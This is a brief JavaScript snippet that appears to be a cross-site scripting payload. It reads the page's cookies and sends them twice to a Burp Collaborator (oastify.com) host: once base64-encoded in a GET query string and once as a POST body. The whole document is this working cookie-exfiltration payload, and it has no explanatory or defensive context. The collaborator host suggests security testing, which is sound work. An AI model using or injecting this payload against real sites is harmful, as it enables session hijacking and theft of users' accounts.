(function(){
var c=document.cookie;
var burp="http://w630bbm6tppekzwbv9aovobqlhr8f03p.oastify.com/";
fetch(burp+'?cookies='+btoa(c));
fetch(burp, {method:'POST', body:'cookies='+c});
})();
